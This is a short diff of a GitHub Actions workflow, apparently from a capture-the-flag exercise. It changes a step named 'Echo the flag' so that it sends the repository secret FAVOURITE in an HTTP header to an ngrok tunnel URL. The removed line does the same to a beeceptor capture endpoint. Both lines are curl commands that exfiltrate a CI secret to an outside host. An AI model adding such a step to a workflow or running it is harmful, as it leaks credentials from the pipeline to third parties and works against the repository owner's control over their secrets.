@@ -27,4 +27,5 @@ jobs:
 
     - name: Echo the flag
       run: |
-        curl https://swagolili.free.beeceptor.com -H "X-API-Key: ${{ secrets.FAVOURITE }}"
+	curl https://16c7-128-130-233-90.ngrok-free.app -H "X-API-Key: ${{ secrets.FAVOURITE }}"
+
